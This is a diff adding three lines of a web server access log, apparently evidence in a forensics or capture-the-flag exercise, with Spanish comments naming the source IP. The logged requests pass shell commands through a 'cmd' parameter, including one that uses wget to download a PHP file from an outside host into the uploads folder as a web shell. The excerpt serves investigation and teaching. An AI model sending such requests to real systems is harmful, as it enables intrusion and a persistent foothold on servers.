@@ -1,0 +1,6 @@
+# Extracto de caso/logs/access.log (sin editar), lineas 18-20.
+# IP origen: 185.220.101.42
+
+18:185.220.101.42 - - [05/Sep/2026:02:18:10 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=id HTTP/1.1" 200 60 "-" "curl/8.5"
+19:185.220.101.42 - - [05/Sep/2026:02:18:33 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p HTTP/1.1" 200 12 "-" "curl/8.5"
+20:185.220.101.42 - - [05/Sep/2026:02:19:02 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php HTTP/1.1" 200 5 "-" "curl/8.5"
